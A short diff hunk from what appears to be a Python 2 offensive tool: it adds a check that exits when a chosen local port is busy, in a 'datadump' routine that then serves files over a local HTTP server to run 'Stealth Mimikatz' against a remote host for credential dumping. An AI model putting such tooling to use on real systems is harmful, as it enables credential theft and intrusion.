@@ -482,14 +482,15 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Looks good",'green')	
 					
 					#Check to make sure port is not already in use
-					for i in xrange(10):
-						PORT = randint(49151,65535)					
-						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
-						stdout_value = proc.communicate()[0]
-						if len(stdout_value)>0:
-							break
-
-
+                                        print colored("[-]Checking if local port is available",'yellow')
+                                        for i in xrange(10):
+                                                PORT = randint(49151,65535)
+                                                proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
+                                                stdout_value = proc.communicate()[0]
+                                                if len(stdout_value)>0:
+                                                        print colored("[-]Port is used: "+str(PORT)+" exiting....",'red')
+                                                        exit(1)
+					
 					my_ip=get_ip_address('eth0')
 					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
 					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
